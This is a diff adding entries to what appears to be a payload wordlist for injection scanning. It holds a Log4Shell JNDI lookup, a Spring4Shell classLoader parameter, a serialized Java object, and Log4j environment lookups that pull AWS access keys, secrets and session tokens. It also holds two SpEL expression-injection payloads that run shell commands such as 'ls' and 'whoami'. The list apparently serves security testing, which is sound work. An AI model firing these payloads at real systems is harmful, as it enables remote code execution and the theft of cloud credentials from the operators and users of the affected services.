@@ -4,3 +4,16 @@ rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9s
 ${jndi:ldap://127.0.0.1/a}
 ${java:version}
 class.module.classLoader.URLs%5B0%5D=0
+${env:AWS_ACCESS_KEY_ID}
+${env:AWS_CONFIG_FILE}
+${env:AWS_PROFILE}
+${env:AWS_SECRET_ACCESS_KEY}
+${env:AWS_SESSION_TOKEN}
+${env:AWS_SHARED_CREDENTIALS_FILE}
+${env:AWS_WEB_IDENTITY_TOKEN_FILE}
+${env:HOSTNAME}
+${env:JAVA_VERSION}
+${env:PATH}
+${env:USER}
+#{new java.util.Scanner(T(java.lang.Process).getMethod('getInputStream').invoke(T(java.lang.Runtime).getRuntime().exec(new String[]{'ls'}))).useDelimiter('\A').next().replace('\n',' ')}
+#{new java.util.Scanner(''.getClass().forName('java.lang.Runtime').getRuntime().exec('whoami').getInputStream()).useDelimiter('\\A').next().replace('\n',' ')}
